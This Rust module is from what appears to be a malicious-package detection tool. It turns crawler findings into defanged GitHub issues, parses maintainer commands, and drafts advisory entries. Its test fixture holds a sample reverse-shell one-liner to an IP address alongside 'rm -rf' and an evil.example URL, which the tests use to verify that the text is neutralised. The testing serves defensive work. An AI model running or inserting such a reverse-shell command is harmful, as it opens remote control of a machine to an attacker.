//! GitHub-issue triage: render a report as an issue, parse maintainer commands, draft corpus entries.
//! Everything from a package is untrusted text: it only ever lands inside code spans/blocks.

use std::fs;
use std::path::{Path, PathBuf};

use anyhow::{bail, Context, Result};
use serde::Serialize;
use serde_json::{json, Value};

use antidote_core::corpus::{next_id, today};

use crate::analyze::{AllowRule, Report};

pub fn issue_title(r: &Report) -> String {
    format!("[triage] {}@{} ({})", r.item.key(), r.item.version, r.score)
}

/// Defang URLs and neutralize anything that could break out of a code span or ping someone.
fn safe(s: &str) -> String {
    let s: String = s.chars().take(200).collect();
    s.replace("://", "[:]//").replace('`', "ʼ").replace('@', "＠").replace(['\n', '\r'], " ")
}

pub fn issue_body(r: &Report, report_path: &str) -> String {
    let mut b = String::new();
    b.push_str(&format!("**Package:** `{}` `{}`  \n**Source:** {}  \n**Score:** {}\n", safe(&r.item.key()), safe(&r.item.version), r.item.source, r.score));
    if let Some(h) = &r.archive_sha256 {
        b.push_str(&format!("**Archive sha256:** `{h}`\n"));
    }
    for (title, hits) in [("Rule matches", &r.findings), ("Metadata flags", &r.flags)] {
        if hits.is_empty() {
            continue;
        }
        b.push_str(&format!("\n### {title}\n\n| Severity | ID | Where | Evidence |\n|---|---|---|---|\n"));
        for h in hits.iter().take(30) {
            let at = h.path.as_ref().map(|p| format!("`{}{}`", safe(p), h.line.map(|l| format!(":{l}")).unwrap_or_default())).unwrap_or_default();
            let ev = h.evidence.as_ref().map(|e| format!("`{}`", safe(e).replace('|', "¦"))).unwrap_or_default();
            b.push_str(&format!("| {} | {} — {} | {at} | {ev} |\n", h.severity, h.id, safe(&h.summary).replace('|', "¦")));
        }
    }
    if !r.domains.is_empty() {
        let d: Vec<String> = r.domains.iter().take(30).map(|d| format!("`{}`", d.replace('.', "[.]"))).collect();
        b.push_str(&format!("\n**Domains in code:** {}\n", d.join(", ")));
    }
    b.push_str("\n---\nMaintainers: `/confirm malicious|vulnerable|suspicious <one-line summary>` · `/reject <reason>` · `/detonate`\n");
    b.push_str(&format!("<!-- antidote-report: {report_path} -->\n"));
    b
}

#[derive(Serialize, Debug, PartialEq)]
#[serde(tag = "action", rename_all = "lowercase")]
pub enum Command {
    Confirm { classification: String, summary: String },
    Reject { reason: String },
    Detonate,
}

/// First `/command` line of a comment, only from people with write access.
pub fn parse_command(body: &str, association: &str) -> Option<Command> {
    if !matches!(association, "OWNER" | "MEMBER" | "COLLABORATOR") {
        return None;
    }
    let line = body.lines().map(str::trim).find(|l| l.starts_with('/'))?;
    let (cmd, rest) = line.split_once(' ').unwrap_or((line, ""));
    let rest = rest.trim();
    match cmd {
        "/confirm" => {
            let (class, summary) = rest.split_once(' ').unwrap_or((rest, ""));
            if !matches!(class, "malicious" | "vulnerable" | "suspicious") {
                return None;
            }
            Some(Command::Confirm { classification: class.into(), summary: summary.trim().into() })
        }
        "/reject" => Some(Command::Reject { reason: rest.into() }),
        "/detonate" => Some(Command::Detonate),
        _ => None,
    }
}

/// Today's UTC date from the system clock (no chrono for one date).
/// Write `corpus/entries/AGT-<year>-<n>.json` from a confirmed report. Returns the path.
pub fn draft_entry(r: &Report, classification: &str, summary: &str, issue_url: &str, corpus: &Path) -> Result<PathBuf> {
    let (y, m, d) = today();
    let id = next_id(&corpus.join("entries"), &format!("AGT-{y}-"))?;
    let date = format!("{y:04}-{m:02}-{d:02}T00:00:00Z");
    let summary = if summary.is_empty() {
        format!("{} {} flagged by crawler: {}", r.item.name, r.item.version, r.findings.iter().chain(&r.flags).next().map_or("", |h| h.summary.as_str()))
    } else {
        summary.to_string()
    };
    let mut sha: Vec<&str> = r.findings.iter().filter_map(|h| h.file_sha256.as_deref()).collect();
    sha.sort();
    sha.dedup();
    let mut detections: Vec<&str> = r.findings.iter().chain(&r.flags).map(|h| h.id.as_str()).collect();
    detections.sort();
    detections.dedup();
    let artifact_type = if r.item.ecosystem == "clawhub" { "skill" } else { "package" };
    let entry: Value = json!({
        "schema_version": "0.1.0",
        "id": id,
        "modified": date,
        "published": date,
        "summary": summary.chars().take(200).collect::<String>(),
        "details": format!("Found by the Antidote crawler ({}). Triage: {issue_url}", r.item.source),
        "references": [{ "type": "REPORT", "url": issue_url }],
        "affected": [{ "package": { "ecosystem": r.item.ecosystem, "name": r.item.name }, "versions": [r.item.version] }],
        "database_specific": {
            "artifact_type": artifact_type,
            "classification": classification,
            "indicators": { "sha256": sha, "domains": r.domains.iter().take(20).collect::<Vec<_>>() },
            "verification": "verified",
            "reporter": "antidote-crawler",
            "detections": detections,
        }
    });
    let path = corpus.join("entries").join(format!("{id}.json"));
    if path.exists() {
        bail!("{} already exists", path.display());
    }
    fs::write(&path, serde_json::to_string_pretty(&entry)? + "\n")?;
    Ok(path)
}

/// Add every rule/flag id of a report to the allowlist for that exact version.
pub fn allow(r: &Report, reason: &str, allowlist: &Path) -> Result<usize> {
    let mut list: Vec<AllowRule> = match fs::read(allowlist) {
        Ok(b) => serde_json::from_slice(&b).context("allowlist is not valid JSON")?,
        Err(_) => vec![],
    };
    let before = list.len();
    for h in r.findings.iter().chain(&r.flags) {
        let rule = AllowRule { key: r.item.key(), version: r.item.version.clone(), id: h.id.clone(), reason: reason.into() };
        if !list.iter().any(|a| a.key == rule.key && a.version == rule.version && a.id == rule.id) {
            list.push(rule);
        }
    }
    fs::write(allowlist, serde_json::to_string_pretty(&list)? + "\n")?;
    Ok(list.len() - before)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::analyze::Hit;
    use crate::crawl::Item;

    fn report() -> Report {
        Report {
            item: Item { source: "npm".into(), ecosystem: "npm".into(), name: "evil-mcp".into(), version: "1.0.0".into(), download: None },
            archive_sha256: Some("ab".repeat(32)),
            findings: vec![Hit {
                severity: "critical".into(),
                id: "AGT-R-0104".into(),
                summary: "Reverse shell one-liner".into(),
                path: Some("package/x.sh".into()),
                line: Some(2),
                evidence: Some("bash -i >& /dev/tcp/1.2.3.4/1 `rm -rf` @someone https://evil.example".into()),
                file_sha256: Some("cd".repeat(32)),
            }],
            flags: vec![],
            domains: vec!["evil.example".into()],
            install_script: true,
            score: "critical".into(),
        }
    }

    #[test]
    fn commands_need_write_access() {
        assert_eq!(parse_command("/detonate", "NONE"), None);
        assert_eq!(parse_command("/detonate", "CONTRIBUTOR"), None);
        assert_eq!(parse_command("thanks!\n/detonate", "MEMBER"), Some(Command::Detonate));
        assert_eq!(
            parse_command("/confirm malicious Steals SSH keys", "OWNER"),
            Some(Command::Confirm { classification: "malicious".into(), summary: "Steals SSH keys".into() })
        );
        assert_eq!(parse_command("/confirm evil x", "OWNER"), None);
        assert_eq!(parse_command("/reject false positive", "COLLABORATOR"), Some(Command::Reject { reason: "false positive".into() }));
    }

    #[test]
    fn issue_body_neutralizes_package_text() {
        let b = issue_body(&report(), "reports/x.json");
        assert!(!b.contains("https://evil"), "{b}");
        assert!(!b.contains("@someone"));
        assert!(!b.contains("`rm -rf`"));
        assert!(b.contains("evil[.]example"));
        assert!(b.contains("<!-- antidote-report: reports/x.json -->"));
    }

    #[test]
    fn drafted_entry_matches_schema() {
        let repo = Path::new(env!("CARGO_MANIFEST_DIR")).join("../..");
        let corpus = tempfile::tempdir().unwrap();
        fs::create_dir(corpus.path().join("entries")).unwrap();
        let p1 = draft_entry(&report(), "malicious", "", "https://github.com/o/r/issues/1", corpus.path()).unwrap();
        let p2 = draft_entry(&report(), "malicious", "Reverse shell in install script", "https://github.com/o/r/issues/2", corpus.path()).unwrap();
        assert!(p1.file_name().unwrap().to_string_lossy().ends_with("-0001.json"));
        assert!(p2.file_name().unwrap().to_string_lossy().ends_with("-0002.json"));

        let schema: Value = serde_json::from_str(&fs::read_to_string(repo.join("schema/entry.schema.json")).unwrap()).unwrap();
        let v = jsonschema::validator_for(&schema).unwrap();
        for p in [p1, p2] {
            let entry: Value = serde_json::from_str(&fs::read_to_string(&p).unwrap()).unwrap();
            let errors: Vec<String> = v.iter_errors(&entry).map(|e| e.to_string()).collect();
            assert!(errors.is_empty(), "{errors:?}");
            assert_eq!(entry["database_specific"]["indicators"]["sha256"][0], "cd".repeat(32));
        }
    }

    #[test]
    fn allowlist_dedupes() {
        let d = tempfile::tempdir().unwrap();
        let p = d.path().join("allowlist.json");
        assert_eq!(allow(&report(), "fp", &p).unwrap(), 1);
        assert_eq!(allow(&report(), "fp", &p).unwrap(), 0);
    }

    #[test]
    fn today_is_sane() {
        let (y, m, d) = today();
        assert!(y >= 2026 && (1..=12).contains(&m) && (1..=31).contains(&d));
    }
}
